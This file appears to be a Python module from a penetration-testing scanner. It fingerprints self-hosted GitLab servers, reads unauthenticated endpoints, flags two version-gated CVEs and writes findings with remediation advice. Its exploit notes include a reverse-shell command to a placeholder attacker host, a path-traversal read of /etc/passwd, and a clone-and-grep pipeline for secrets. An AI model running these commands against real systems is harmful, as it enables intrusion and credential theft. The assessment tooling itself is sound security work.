"""GitLab CE/EE self-hosted probe (HTTP surface — 80/443/8080/8443).

GitLab is frequently deployed on internal networks — one instance per team,
often against corporate policy, and often left with the API's public
endpoints unauthenticated. This module fingerprints a GitLab instance by
response body ("GitLab") or by a `_gitlab_session` cookie, then reads a
short, bounded set of read-only endpoints:

  * GET /api/v4/version         — auth-required in most releases, but
                                  historically unauth on old builds; the
                                  probe records a leaked build string when
                                  it is returned unauth
  * GET /-/health, /-/readiness, /-/liveness — the health surface leaks
                                  process/version info without auth
  * GET /users/sign_in          — presence of the sign-in form is the
                                  classic cred-spray target (we never spray
                                  from the probe — see RULES)
  * GET /api/v4/projects?visibility=public — public project listing; even
                                  a handful of hits is a metadata leak
  * GET /explore/projects       — same surface as HTML for compatibility
  * GET /api/v4/broadcast_messages — often leaks internal announcements

Version-gated CVE markers (NEVER unverified — the version must actually
parse and satisfy the gate):

  * CVE-2021-22205 — unauth RCE in the embedded ExifTool parser used on
                     avatar/upload processing. Fixed in 13.8.8 / 13.9.6 /
                     13.10.3. Marker is version-gated only; we do NOT send
                     a payload.
  * CVE-2023-2825  — path traversal via nested-group /uploads path handler.
                     Affects only 16.0.0 (fixed in 16.0.1).

Airgap-safe: stdlib http.client + ssl. Bounded (~7 GETs), single-shot,
non-destructive.
"""
from __future__ import annotations

import http.client
import json
import re
import ssl

from ..core.models import Host, Port


_DEFAULT_PORT = 80
_TIMEOUT = 3.0
_UA = "recce-probe/1.0"

# Ports where a GitLab HTTP surface plausibly lives. Fingerprint decides
# — never assume just because the port is open (see RULES).
_HTTP_PORTS = (80, 443, 8080, 8443)


def is_gitlab_http(port: Port) -> bool:
    """Loose port gate — the real filter is the fingerprint inside probe().
    We opt into every HTTP-ish port that could reasonably front a GitLab
    reverse proxy; without an actual body/cookie signature the probe still
    stays silent."""
    if port.portid not in _HTTP_PORTS:
        return False
    svc = (port.service or "").lower()
    prod = (port.product or "").lower()
    # Common tells nmap leaves on a service that looks web-ish; but also
    # accept when nmap has nothing at all (a bare `http` guess) because
    # the fingerprint step will reject non-GitLab targets.
    return ("http" in svc or "http" in prod or "gitlab" in svc
            or "gitlab" in prod or svc in ("", "unknown"))


def _http(ip: str, port: int, path: str, timeout: float = _TIMEOUT,
          use_tls: bool | None = None):
    """One GET. Transparently tries HTTP then HTTPS (or the caller-forced
    scheme) so we don't emit two probe attempts. Returns (status, headers,
    body) or None on complete failure."""
    schemes: tuple
    if use_tls is None:
        # 443/8443 default to TLS-first (typical GitLab), else HTTP-first.
        schemes = (True, False) if port in (443, 8443) else (False, True)
    else:
        schemes = (use_tls,)
    for tls in schemes:
        conn = None
        try:
            if tls:
                ctx = ssl._create_unverified_context()
                conn = http.client.HTTPSConnection(
                    ip, port, timeout=timeout, context=ctx)
            else:
                conn = http.client.HTTPConnection(ip, port, timeout=timeout)
            conn.request("GET", path,
                         headers={"User-Agent": _UA, "Connection": "close",
                                  "Accept": "application/json, text/html"})
            resp = conn.getresponse()
            body = resp.read(200_000)
            hdrs = {k.lower(): v for k, v in resp.getheaders()}
            return resp.status, hdrs, body
        except (OSError, http.client.HTTPException, ssl.SSLError, ValueError):
            continue
        finally:
            if conn is not None:
                try: conn.close()
                except OSError: pass
    return None


# --- Fingerprint & version parsing ------------------------------------------

_GITLAB_BODY_MARK = re.compile(rb"GitLab", re.IGNORECASE)
_GITLAB_COOKIE_MARK = re.compile(r"_gitlab_session", re.IGNORECASE)
# Match the classic sign-in body markers so a stray "GitLab" in the tag
# of another product's page doesn't falsely flag.
_SIGNIN_MARK = re.compile(
    rb'(name="user\[login\]"|GitLab Community Edition|GitLab Enterprise Edition)',
    re.IGNORECASE)
# Version string as GitLab ships it — e.g. "15.7.1", "16.11.0-ee",
# "13.10.3-ce". We accept the leading three-part triple only.
_VERSION_RE = re.compile(r"\b(\d{1,2})\.(\d{1,2})\.(\d{1,3})(?:-(?:ce|ee))?\b",
                         re.IGNORECASE)


def _looks_like_gitlab(status: int, hdrs: dict, body: bytes) -> bool:
    """A response is GitLab if the body says so OR any Set-Cookie carries
    _gitlab_session (independent evidence — proxies rewrite bodies but
    tend to pass session cookies through)."""
    if not body and status >= 500:
        return False
    if _GITLAB_BODY_MARK.search(body or b""):
        return True
    set_cookie = hdrs.get("set-cookie", "")
    if _GITLAB_COOKIE_MARK.search(set_cookie):
        return True
    return False


def _parse_version(text: str) -> tuple[int, int, int] | None:
    """Return (major, minor, patch) or None. First match only — GitLab's
    version endpoints put the real version at the top."""
    if not text:
        return None
    m = _VERSION_RE.search(text)
    if not m:
        return None
    try:
        return int(m.group(1)), int(m.group(2)), int(m.group(3))
    except (TypeError, ValueError):
        return None


def _version_str(v: tuple[int, int, int] | None) -> str:
    return "" if v is None else f"{v[0]}.{v[1]}.{v[2]}"


def _cve_2021_22205(v: tuple[int, int, int]) -> bool:
    """Unauth ExifTool RCE. Fixed in 13.8.8, 13.9.6, 13.10.3 — anything
    earlier on those branches is vulnerable; anything on 13.7 or below is
    vulnerable; 13.11+ / 14+ are fixed."""
    maj, minr, patch = v
    if maj < 13:
        return True
    if maj > 13:
        return False
    # major == 13
    if minr <= 7:
        return True
    if minr == 8:
        return patch < 8
    if minr == 9:
        return patch < 6
    if minr == 10:
        return patch < 3
    return False


def _cve_2023_2825(v: tuple[int, int, int]) -> bool:
    """Path traversal via /uploads on nested groups. Affects 16.0.0 only
    (fixed in 16.0.1). Extremely narrow gate — don't over-claim."""
    return v == (16, 0, 0)


# --- Probe --------------------------------------------------------------------

def probe(ip: str, port: int = _DEFAULT_PORT, timeout: float = _TIMEOUT) -> dict:
    """Return a dict describing what the GitLab HTTP surface exposes. Never
    raises. Every key is present so callers can index without .get(k, x)."""
    out: dict = {
        "reachable": False,
        "version": "",
        "version_tuple": None,
        "version_source": "",     # which endpoint yielded it
        "health_endpoints": [],   # list of paths that answered 200 with GL body
        "signin_present": False,
        "public_projects": [],    # sample names (list of dicts)
        "public_projects_count": 0,
        "broadcast_messages": 0,  # count if leaked
        "explore_projects": False,
        "cve_2021_22205": False,
        "cve_2023_2825": False,
    }

    # Step 1 — fingerprint via the sign-in page (present on nearly every
    # deployment; not gated behind auth). We accept EITHER the body or the
    # session cookie as proof.
    r = _http(ip, port, "/users/sign_in", timeout)
    if r is not None:
        status, hdrs, body = r
        if _looks_like_gitlab(status, hdrs, body):
            out["reachable"] = True
            if status == 200 and _SIGNIN_MARK.search(body or b""):
                out["signin_present"] = True

    # Step 2 — if step 1 failed, try / — some deployments redirect / to
    # /users/sign_in via a header a spartan client doesn't follow.
    if not out["reachable"]:
        r = _http(ip, port, "/", timeout)
        if r is not None and _looks_like_gitlab(r[0], r[1], r[2]):
            out["reachable"] = True

    if not out["reachable"]:
        return out

    # Step 3 — version via /api/v4/version. Historically unauth; on modern
    # releases returns 401 and we fall back to /-/health output or a
    # <meta> tag reading. We keep the parse strict.
    r = _http(ip, port, "/api/v4/version", timeout)
    if r is not None and r[0] == 200:
        try:
            j = json.loads(r[2].decode("utf-8", "replace"))
            v_text = str(j.get("version") or "")
            vt = _parse_version(v_text)
            if vt:
                out["version_tuple"] = vt
                out["version"] = _version_str(vt)
                out["version_source"] = "/api/v4/version"
        except (ValueError, UnicodeDecodeError):
            pass

    # Step 4 — health endpoints. GitLab exposes plain-text status on the
    # /-/{health,readiness,liveness} surface; the ones that answer are
    # info-disclosure. `readiness` in particular embeds check status lines.
    for path in ("/-/health", "/-/readiness", "/-/liveness"):
        r = _http(ip, port, path, timeout)
        if r is None:
            continue
        status, _hdrs, body = r
        if status == 200:
            out["health_endpoints"].append(path)
            # Second-chance version parse from /-/readiness or /-/health
            # body if /api/v4/version was gated.
            if not out["version"]:
                vt = _parse_version((body or b"").decode("utf-8", "replace"))
                if vt:
                    out["version_tuple"] = vt
                    out["version"] = _version_str(vt)
                    out["version_source"] = path

    # Step 5 — public project listing. `visibility=public` returns any
    # project marked public without auth. Even a handful is disclosure.
    r = _http(ip, port,
              "/api/v4/projects?visibility=public&per_page=20&simple=true",
              timeout)
    if r is not None and r[0] == 200:
        try:
            j = json.loads(r[2].decode("utf-8", "replace"))
            if isinstance(j, list):
                sample = []
                for row in j[:10]:
                    if not isinstance(row, dict):
                        continue
                    sample.append({
                        "name": str(row.get("name_with_namespace")
                                    or row.get("path_with_namespace")
                                    or row.get("name") or "")[:160],
                        "web_url": str(row.get("web_url") or "")[:200],
                    })
                out["public_projects"] = sample
                out["public_projects_count"] = len(j)
        except (ValueError, UnicodeDecodeError):
            pass

    # Step 6 — /explore/projects (HTML variant). We only note presence.
    if not out["public_projects"]:
        r = _http(ip, port, "/explore/projects", timeout)
        if r is not None and r[0] == 200 and _looks_like_gitlab(r[0], r[1], r[2]):
            out["explore_projects"] = True

    # Step 7 — broadcast messages. Often unauth on older builds; leaks
    # internal announcements ("maintenance window Sat", release notes).
    r = _http(ip, port, "/api/v4/broadcast_messages", timeout)
    if r is not None and r[0] == 200:
        try:
            j = json.loads(r[2].decode("utf-8", "replace"))
            if isinstance(j, list):
                out["broadcast_messages"] = len(j)
        except (ValueError, UnicodeDecodeError):
            pass

    # Version-gated CVE markers. Only when the version actually parsed.
    if out["version_tuple"]:
        out["cve_2021_22205"] = _cve_2021_22205(out["version_tuple"])
        out["cve_2023_2825"] = _cve_2023_2825(out["version_tuple"])

    return out


def gitlab_targets(hosts: list[Host]) -> list[dict]:
    """Module-scope function (matches _module_scoped_check qualname rule)."""
    out = []
    for h in hosts:
        for p in h.open_ports:
            if is_gitlab_http(p):
                out.append({"ip": h.ip, "port": p.portid,
                            "version": f"{p.product} {p.version}".strip()})
    return out


# --- Findings ---------------------------------------------------------------

_NARRATIVE = {
    "gitlab_reachable": (
        "A GitLab instance answers on this HTTP surface. GitLab hosts source "
        "code, CI runners, container images, and — often — cleartext secrets "
        "embedded in .gitlab-ci.yml. Any credential recovered elsewhere in the "
        "engagement is worth trying against /users/sign_in and the API."),
    "gitlab_version": (
        "GitLab version disclosure lets an attacker map the exact build to "
        "public CVEs. Version strings are exposed on /api/v4/version, the "
        "/-/health surface, and often in HTML meta tags — none of these are "
        "gated by auth on many deployments."),
    "gitlab_public_projects": (
        "Public projects are readable without a login. Even project titles "
        "and web URLs are enough for org-mapping, and any repository marked "
        "public discloses source code, commit history, and often secrets."),
    "gitlab_health_endpoint": (
        "The /-/health, /-/readiness, and /-/liveness endpoints answer "
        "without auth and disclose runtime info (versions, running checks). "
        "They are also useful for reliable uptime probing during an attack."),
    "gitlab_signin_present": (
        "The /users/sign_in form is a credential-spray target. Any looted "
        "corporate credential — especially SSO shared secrets — is worth "
        "trying here. This probe never sprays."),
    "gitlab_broadcast_messages": (
        "/api/v4/broadcast_messages returned data without auth. Broadcast "
        "banners frequently mention internal hosts, maintenance windows, "
        "and upgrade plans — free reconnaissance."),
    "gitlab_cve_2021_22205": (
        "Unauthenticated RCE via the ExifTool image parser. Fixed in "
        "13.8.8 / 13.9.6 / 13.10.3. Confirmed exploitable public PoC exists; "
        "no auth required."),
    "gitlab_cve_2023_2825": (
        "Path traversal via /uploads on nested groups (affects 16.0.0 only)."
        " Fixed in 16.0.1. Marker only — verify with a read of a known file."),
}


def _finding(sev, title, target, detail, cmd, rem, cwes, kind="",
             exploit_note="", depth_tier="", output=""):
    return {"severity": sev, "title": title, "target": target, "detail": detail,
            "tool": "curl", "command": cmd, "remediation": rem,
            "cwes": cwes, "kind": kind,
            "narrative": _NARRATIVE.get(kind, ""),
            "exploit_note": exploit_note, "depth_tier": depth_tier,
            "output": output}


def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
    probes = probes or {}
    out: list[dict] = []
    for h in hosts:
        for p in h.open_ports:
            if not is_gitlab_http(p):
                continue
            pr = probes.get((h.ip, p.portid))
            if not pr or not pr.get("reachable"):
                continue
            tgt = f"{h.ip}:{p.portid}"

            # CRITICAL — CVE-2021-22205 unauth RCE (version-gated).
            if pr.get("cve_2021_22205"):
                v = pr.get("version") or "?"
                out.append(_finding(
                    "critical",
                    f"GitLab {v} vulnerable to CVE-2021-22205 (unauth RCE)",
                    tgt,
                    f"GitLab reports version {v}, which is on a branch "
                    "susceptible to CVE-2021-22205 — unauthenticated remote "
                    "code execution via the ExifTool image processor "
                    "(fixed in 13.8.8 / 13.9.6 / 13.10.3). No credentials are "
                    "required; the attack targets the avatar upload path. "
                    "This finding is version-gated only — no exploit request "
                    "was issued by the probe.",
                    f"curl -sk http://{h.ip}:{p.portid}/api/v4/version",
                    "Upgrade GitLab to a patched release (>= 13.10.3, or "
                    "13.9.6 / 13.8.8 on those branches; ideally the current "
                    "supported release).",
                    ["CWE-434", "CWE-94"], kind="gitlab_cve_2021_22205",
                    exploit_note=(
                        "python3 CVE-2021-22205.py <ip>:<port> "
                        "'bash -c \"bash -i >& /dev/tcp/<attacker>/4444 0>&1\"' "
                        "# public PoC uses a crafted DjVu image via the "
                        "avatar upload; exploit runs as `git` (runner) UID."),
                    depth_tier="t0"))

            # HIGH — CVE-2023-2825 path traversal (very narrow version gate).
            if pr.get("cve_2023_2825"):
                v = pr.get("version") or "?"
                out.append(_finding(
                    "high",
                    f"GitLab {v} vulnerable to CVE-2023-2825 (path traversal)",
                    tgt,
                    f"GitLab {v} is affected by CVE-2023-2825, a path "
                    "traversal via the /uploads route on nested groups "
                    "(fixed in 16.0.1). An unauthenticated attacker can "
                    "read arbitrary files under the GitLab process UID.",
                    f"curl -sk http://{h.ip}:{p.portid}/api/v4/version",
                    "Upgrade GitLab to 16.0.1 or later.",
                    ["CWE-22"], kind="gitlab_cve_2023_2825",
                    exploit_note=(
                        "curl -sk 'http://<ip>/uploads/-/system/appearance/"
                        "logo/1/../../../../../../../../etc/passwd' # verify "
                        "with a file the tester already owns permission to."),
                    depth_tier="t0"))

            # MEDIUM — public project listing.
            proj_n = pr.get("public_projects_count", 0)
            if proj_n:
                sample = pr.get("public_projects") or []
                names = ", ".join(s.get("name", "") for s in sample[:5])
                out.append(_finding(
                    "medium",
                    "GitLab public projects listable without authentication",
                    tgt,
                    f"/api/v4/projects?visibility=public returned "
                    f"{proj_n} public project(s) without a login. "
                    f"First few: {names}"
                    + ("..." if proj_n > 5 else "") + " Repositories "
                    "flagged public disclose source and commit history, "
                    "and secrets committed in error are frequently mined "
                    "from public repos.",
                    (f"curl -sk 'http://{h.ip}:{p.portid}/api/v4/projects"
                     "?visibility=public&per_page=100'"),
                    "Audit projects with `visibility=public`; downgrade to "
                    "internal or private unless publication is intentional. "
                    "Consider tightening the instance default visibility.",
                    ["CWE-200"], kind="gitlab_public_projects",
                    exploit_note=(
                        "curl -sk 'http://<ip>/api/v4/projects?visibility="
                        "public&per_page=100' | jq -r '.[].http_url_to_repo' "
                        "| xargs -I{} git clone {} && grep -RIn --binary-"
                        "files=without-match -E 'password|BEGIN [A-Z ]*"
                        "PRIVATE|AKIA[0-9A-Z]{16}' ."),
                    depth_tier="t1"))
            elif pr.get("explore_projects"):
                out.append(_finding(
                    "low",
                    "GitLab public project explorer reachable",
                    tgt,
                    "GET /explore/projects returned a GitLab explorer page. "
                    "Even when the API projects list is empty, the HTML "
                    "explorer enumerates public groups and users.",
                    f"curl -sk http://{h.ip}:{p.portid}/explore/projects",
                    "Disable the public explorer or restrict it to logged-in "
                    "users in Admin Area -> Settings -> General -> Visibility.",
                    ["CWE-200"], kind="gitlab_public_projects",
                    exploit_note=(
                        "curl -sk http://<ip>/explore/projects | grep -oE "
                        "'/[a-z0-9-]+/[a-z0-9-]+' | sort -u"),
                    depth_tier="t1"))

            # MEDIUM — broadcast messages leak.
            if pr.get("broadcast_messages"):
                out.append(_finding(
                    "low",
                    "GitLab broadcast messages readable without authentication",
                    tgt,
                    f"/api/v4/broadcast_messages returned "
                    f"{pr['broadcast_messages']} message(s) without auth. "
                    "Broadcast banners frequently name internal hosts, "
                    "upgrade windows, or the admin who scheduled the "
                    "maintenance — useful phish and social-engineering fuel.",
                    (f"curl -sk http://{h.ip}:{p.portid}"
                     "/api/v4/broadcast_messages"),
                    "Restrict the broadcast_messages API (require "
                    "authentication) or scrub sensitive content from the "
                    "broadcast text.",
                    ["CWE-200"], kind="gitlab_broadcast_messages",
                    exploit_note=(
                        "curl -sk http://<ip>/api/v4/broadcast_messages "
                        "| jq -r '.[].message'"),
                    depth_tier="t1"))

            # LOW — health endpoints.
            if pr.get("health_endpoints"):
                paths = ", ".join(pr["health_endpoints"])
                out.append(_finding(
                    "low",
                    "GitLab /-/health surface exposed",
                    tgt,
                    f"Health endpoints answered 200 without auth: {paths}. "
                    "These endpoints disclose runtime info (version, running "
                    "checks) and serve as an uptime oracle for attack timing.",
                    f"curl -sk http://{h.ip}:{p.portid}/-/readiness",
                    "Restrict /-/health, /-/readiness, and /-/liveness to "
                    "the loadbalancer's IP range at the reverse proxy.",
                    ["CWE-200"], kind="gitlab_health_endpoint",
                    exploit_note=(
                        "for p in /-/health /-/readiness /-/liveness; do "
                        "curl -sk \"http://<ip>$p\"; done"),
                    depth_tier="t1"))

            # INFO/HIGH — version disclosure (severity lifts when a CVE gate
            # already flagged; otherwise info).
            if pr.get("version"):
                sev = ("high"
                       if (pr.get("cve_2021_22205") or pr.get("cve_2023_2825"))
                       else "info")
                out.append(_finding(
                    sev,
                    f"GitLab version {pr['version']} disclosed",
                    tgt,
                    f"Version {pr['version']} disclosed via "
                    f"{pr.get('version_source', '?')}. Version pins the "
                    "attack surface to the exact CVE set for that build.",
                    (f"curl -sk http://{h.ip}:{p.portid}"
                     f"{pr.get('version_source') or '/api/v4/version'}"),
                    "Require authentication for /api/v4/version; strip "
                    "version headers at the reverse proxy.",
                    ["CWE-200"], kind="gitlab_version",
                    exploit_note=(
                        "curl -sk http://<ip>/api/v4/version | jq -r "
                        ".version # then search-sploit gitlab <version>"),
                    depth_tier="t0"))

            # INFO — sign-in form presence.
            if pr.get("signin_present"):
                out.append(_finding(
                    "info",
                    "GitLab sign-in form present",
                    tgt,
                    "GET /users/sign_in returned a GitLab sign-in form. "
                    "Any recovered credential (SSO shared account, git-config "
                    "leftover) is worth trying here. This probe does NOT "
                    "spray — spraying belongs in a deliberate credentialed "
                    "action.",
                    f"curl -sk http://{h.ip}:{p.portid}/users/sign_in",
                    "Front /users/sign_in with rate-limiting and, ideally, "
                    "an authenticated reverse proxy for external exposure.",
                    ["CWE-307"], kind="gitlab_signin_present",
                    exploit_note=(
                        "# Do NOT spray from the probe. Once cred is in "
                        "hand: curl -sk -c /tmp/gl.jar -b /tmp/gl.jar "
                        "http://<ip>/users/sign_in # scrape authenticity_"
                        "token, then POST user[login]/user[password]."),
                    depth_tier="t0"))

            # INFO — always emit a reachable marker for report visibility.
            out.append(_finding(
                "info",
                "GitLab HTTP surface reachable",
                tgt,
                (f"GitLab detected on {tgt}. Version="
                 f"{pr.get('version') or '?'}, "
                 f"public_projects={pr.get('public_projects_count', 0)}, "
                 f"health={len(pr.get('health_endpoints') or [])} endpoint(s), "
                 f"signin_present={pr.get('signin_present')}."),
                f"curl -sk http://{h.ip}:{p.portid}/users/sign_in",
                "Restrict external exposure of GitLab to VPN or an "
                "authenticating reverse proxy.",
                [], kind="gitlab_reachable",
                exploit_note=(
                    "curl -sk http://<ip>/api/v4/version; "
                    "curl -sk http://<ip>/-/readiness"),
                depth_tier="t1"))
    return out


def runbook(ip: str, port: int) -> list[dict]:
    return [
        {"step": "Fingerprint (sign-in page)",
         "cmd": f"curl -sk http://{ip}:{port}/users/sign_in | head -c 200"},
        {"step": "Version",
         "cmd": f"curl -sk http://{ip}:{port}/api/v4/version"},
        {"step": "Health surface",
         "cmd": (f"for p in /-/health /-/readiness /-/liveness; do "
                 f"echo == $p ==; curl -sk http://{ip}:{port}$p; done")},
        {"step": "Public projects",
         "cmd": (f"curl -sk 'http://{ip}:{port}/api/v4/projects?"
                 f"visibility=public&per_page=100'")},
        {"step": "Broadcast messages",
         "cmd": f"curl -sk http://{ip}:{port}/api/v4/broadcast_messages"},
    ]


def findings_to_vulns(fs: list[dict]) -> dict:
    from .svccommon import findings_to_vulns as _f2v
    return _f2v(fs, "gitlab", _DEFAULT_PORT)


def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
            budget: float | None = None, progress=None) -> dict:
    from . import svcprobe
    targets = gitlab_targets(hosts)
    probes: dict = {}
    state: dict = {}
    if active:
        for t, pr in svcprobe.iter_probe(
                targets, lambda t: probe(t["ip"], t["port"]),
                budget=budget, progress=progress, state=state):
            if pr:
                probes[(t["ip"], t["port"])] = pr
                t["reachable"] = pr.get("reachable", False)
                t["version"] = pr.get("version", "")
                t["public_projects"] = pr.get("public_projects_count", 0)
                t["cve_2021_22205"] = pr.get("cve_2021_22205", False)
                t["cve_2023_2825"] = pr.get("cve_2023_2825", False)
    fs = findings(hosts, probes)
    runbooks = [{"target": f"{t['ip']}:{t['port']}", "ip": t["ip"],
                 "credfree": runbook(t["ip"], t["port"]), "credentialed": []}
                for t in targets]
    return {"targets": targets, "findings": fs, "runbooks": runbooks,
            "probes": {f"{k[0]}:{k[1]}": v for k, v in probes.items()},
            "stats": {"targets": len(targets), "findings": len(fs),
                      "stopped": state.get("stopped")}}
